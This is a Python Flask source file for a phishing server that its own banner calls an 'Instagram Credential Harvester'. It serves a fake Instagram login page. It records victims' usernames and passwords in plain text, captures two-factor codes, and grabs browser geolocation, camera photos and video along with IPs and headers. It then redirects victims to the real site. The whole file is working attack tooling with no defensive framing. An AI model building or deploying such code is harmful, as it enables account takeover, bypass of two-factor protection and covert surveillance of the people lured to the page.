#!/usr/bin/env python3
import os
import json
import time
from flask import Flask, request, render_template, jsonify, redirect
from colorama import init, Fore, Style
from datetime import datetime
import threading
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import logging
from logging.handlers import RotatingFileHandler
import secrets

# Initialize colorama for terminal colors
init()

# Configure logging
def setup_logging():
    log_dir = 'logs'
    os.makedirs(log_dir, exist_ok=True)
    
    # Create a rotating file handler
    file_handler = RotatingFileHandler(
        os.path.join(log_dir, 'app.log'),
        maxBytes=1024 * 1024,  # 1MB
        backupCount=5
    )
    file_handler.setFormatter(logging.Formatter(
        '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
    ))
    
    # Configure root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.INFO)
    root_logger.addHandler(file_handler)

# Create Flask application with proper configuration
app = Flask(__name__, template_folder='templates')

# Security headers
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response

# Rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# Create required directories with proper permissions
def setup_directories():
    directories = ['data', 'upload', 'logs']
    for directory in directories:
        os.makedirs(directory, exist_ok=True)
        # Set directory permissions to 700
        os.chmod(directory, 0o700)

# Stats variables with thread safety
class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.visitor_count = 0
        self.login_count = 0
        self.photo_count = 0
    
    def increment_visitor(self):
        with self._lock:
            self.visitor_count += 1
            return self.visitor_count
    
    def increment_login(self):
        with self._lock:
            self.login_count += 1
            return self.login_count
    
    def increment_photo(self):
        with self._lock:
            self.photo_count += 1
            return self.photo_count

stats = Stats()

def get_real_ip():
    """Get the real IP address of the client with proper validation"""
    headers_list = request.headers.getlist("X-Forwarded-For")
    if headers_list:
        client_ip = headers_list[0].split(',')[0].strip()
    else:
        client_ip = request.remote_addr
    
    # Basic IP validation
    if not client_ip or not isinstance(client_ip, str):
        return '0.0.0.0'
    return client_ip

def sanitize_filename(filename):
    """Sanitize filename to prevent directory traversal attacks"""
    return ''.join(c for c in filename if c.isalnum() or c in ('-', '_', '.'))

def save_data_to_file(data, prefix, extension='json'):
    """Save data to file with proper error handling and sanitization"""
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f'{prefix}_{timestamp}.{extension}'
        filename = sanitize_filename(filename)
        
        filepath = os.path.join('data', filename)
        
        if extension == 'json':
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
        else:
            with open(filepath, 'w', encoding='utf-8') as f:
                for key, value in data.items():
                    f.write(f"{key}: {value}\n")
        
        # Set file permissions to 600
        os.chmod(filepath, 0o600)
        return True
    except Exception as e:
        app.logger.error(f"Error saving data to file: {str(e)}")
        return False

@app.route('/')
@limiter.limit("10 per minute")
def index():
    """Main route - displays the login page"""
    visitor_count = stats.increment_visitor()
    
    # Log the new visitor
    app.logger.info(f"New visitor! Total visitors: {visitor_count}")
    
    # Save visitor info
    visitor_data = {
        'timestamp': datetime.now().strftime('%Y-%m-%d_%H-%M-%S'),
        'ip_address': get_real_ip(),
        'user_agent': request.user_agent.string
    }
    
    save_data_to_file(visitor_data, 'visitor', 'txt')
    
    return render_template('phone.html')

@app.route('/capture_photo', methods=['POST'])
@limiter.limit("5 per minute")
def capture_photo():
    """Process photos captured from the camera"""
    try:
        image_data = request.json.get('image', '')
        if not image_data or ',' not in image_data:
            return jsonify({'status': 'error', 'message': 'Invalid image data'}), 400
        
        # Extract the base64 data after the comma
        import base64
        image_data = image_data.split(',')[1]
        
        # Validate base64 data
        try:
            base64.b64decode(image_data)
        except:
            return jsonify({'status': 'error', 'message': 'Invalid base64 data'}), 400
        
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = sanitize_filename(f'photo_instagram_{timestamp}.jpg')
        
        # Save the image data to a file
        with open(os.path.join('upload', filename), 'wb') as f:
            f.write(base64.b64decode(image_data))
        
        # Set file permissions to 600
        os.chmod(os.path.join('upload', filename), 0o600)
        
        photo_count = stats.increment_photo()
        app.logger.info(f"Photo captured! Total photos: {photo_count}")
        
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        app.logger.error(f"Error capturing photo: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/save_location', methods=['POST'])
def save_location():
    """Save location data from the browser"""
    try:
        # Get location data from request
        lat = request.json.get('lat', 'Unknown')
        lng = request.json.get('lng', 'Unknown')
        accuracy = request.json.get('accuracy', 'Unknown')
        
        # Create Google Maps URL
        maps_url = f'https://www.google.com/maps?q={lat},{lng}'
        
        # Get current timestamp
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        
        # Save location data to file
        with open(f'data/location_{timestamp}.txt', 'w', encoding='utf-8') as f:
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"IP Address: {get_real_ip()}\n")
            f.write(f"Latitude: {lat}\n")
            f.write(f"Longitude: {lng}\n")
            f.write(f"Accuracy: {accuracy} meters\n")
            f.write(f"Maps URL: {maps_url}\n")
        
        print(f"{Fore.GREEN}[+] Location data saved! Coordinates: {lat}, {lng}{Style.RESET_ALL}")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        print(f"{Fore.RED}[!] Error saving location: {str(e)}{Style.RESET_ALL}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/login', methods=['POST'])
def login():
    """Process login attempts"""
    try:
        # Get credentials from request
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # Log the data
        print(f"\n{Fore.YELLOW}[*] Login attempt received!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Username: {username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Password: {password}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] IP Address: {get_real_ip()}{Style.RESET_ALL}")
        
        # Get current timestamp
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        
        # Create data object
        login_data = {
            'timestamp': timestamp,
            'username': username,
            'password': password,
            'ip_address': get_real_ip(),
            'user_agent': request.user_agent.string
        }
        
        # Save data to JSON file
        with open(f'data/instagram_login_{timestamp}.json', 'w', encoding='utf-8') as f:
            json.dump(login_data, f, indent=4)
        
        # Also save as plain text
        with open(f'data/instagram_login_{timestamp}.txt', 'w', encoding='utf-8') as f:
            for key, value in login_data.items():
                f.write(f"{key}: {value}\n")
        
        # Increment login counter
        login_count = stats.increment_login()
        
        # Redirect to verification page
        return redirect('/verification')
    except Exception as e:
        print(f"{Fore.RED}[!] Error processing login: {str(e)}{Style.RESET_ALL}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/verify', methods=['POST'])
def verify():
    """Process 2FA verification code"""
    try:
        # Get verification code from request
        code = request.form.get('verification_code', '')
        
        # Log the data with clear formatting
        print(f"\n{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] 2FA Verification Code Received!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Code: {Fore.GREEN}{code}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] IP Address: {get_real_ip()}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
        
        # Get current timestamp
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        
        # Create data object
        verify_data = {
            'timestamp': timestamp,
            'verification_code': code,
            'ip_address': get_real_ip(),
            'user_agent': request.user_agent.string
        }
        
        # Save data to JSON file
        with open(f'data/instagram_verify_{timestamp}.json', 'w', encoding='utf-8') as f:
            json.dump(verify_data, f, indent=4)
        
        # Also save as plain text
        with open(f'data/instagram_verify_{timestamp}.txt', 'w', encoding='utf-8') as f:
            for key, value in verify_data.items():
                f.write(f"{key}: {value}\n")
        
        # Redirect to Instagram
        return redirect('https://www.instagram.com/')
    except Exception as e:
        print(f"{Fore.RED}[!] Error processing verification: {str(e)}{Style.RESET_ALL}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/verification')
def verification():
    """Display the verification page"""
    return render_template('verification.html')

@app.route('/upload_video', methods=['POST'])
def upload_video():
    try:
        if 'video' not in request.files:
            logger.error("No video file in request")
            return jsonify({"error": "No video file provided"}), 400
            
        video_file = request.files['video']
        
        # Create videos directory if it doesn't exist
        videos_dir = os.path.join(app.root_path, 'captured_videos')
        if not os.path.exists(videos_dir):
            os.makedirs(videos_dir)
            
        # Create session folder using timestamp and IP address
        session_id = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{request.remote_addr.replace('.', '-')}"
        session_dir = os.path.join(videos_dir, session_id)
        if not os.path.exists(session_dir):
            os.makedirs(session_dir)
        
        # Save the video with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        video_filename = f"verification_video_{timestamp}.webm"
        video_path = os.path.join(session_dir, video_filename)
        video_file.save(video_path)
        
        # Log success with more details
        logger.info(f"Video saved successfully at {video_path} from {request.remote_addr}")
        
        # Create a metadata file with additional information
        metadata = {
            "ip_address": request.remote_addr,
            "user_agent": request.user_agent.string,
            "timestamp": timestamp,
            "headers": dict(request.headers),
        }
        
        with open(os.path.join(session_dir, "metadata.json"), "w") as f:
            json.dump(metadata, f, indent=4)
            
        return jsonify({"success": True, "filename": video_filename})
    except Exception as e:
        logger.exception(f"Error saving video: {str(e)}")
        return jsonify({"error": str(e)}), 500

# Health check endpoint
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'online',
        'visitors': stats.visitor_count,
        'logins': stats.login_count,
        'photos': stats.photo_count
    }), 200

if __name__ == '__main__':
    # Setup logging
    setup_logging()
    
    # Setup directories
    setup_directories()
    
    # Print banner
    print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Instagram Credential Harvester{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Server starting on port 8000...{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*50}{Style.RESET_ALL}")
    
    # Run the application
    app.run(host='0.0.0.0', port=50005, debug=False) 